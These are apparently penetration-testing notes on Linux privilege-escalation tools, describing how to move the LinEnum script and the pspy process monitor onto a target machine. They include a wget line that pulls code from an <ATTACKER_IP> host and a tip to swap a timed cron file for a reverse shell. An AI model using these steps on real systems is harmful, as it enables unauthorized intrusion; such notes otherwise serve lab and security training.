################## LinEnum ##################
LinEnum - bash script that performs common commands related to privilege escalation

Get LinEnum on the target machine (executable directory /tmp):
  python3 -m http.server 8000
  wget http://<ATTACKER_IP>:PORT/LinEnum.sh /tmp
  chmod +x LinEnum.sh
or
  Copy the raw LinEnum code from github and paste into new file
  in the target machine
  chmod +x LinEnum.sh


################## pspy ##################
pspy - Monitor linux processes without root permissions 
Source: https://github.com/DominicBreuker/pspy

Installation:
  Download 64bit static version
Transfer the file to target box and run:
  chmod +x pspy64
  ./pspy64
          Check if the interesting file is listed on a timer
          if it is then you can change it for reverse shell

Informational:
  Run it if you found some interesting cron job to validate if it's running on a timer
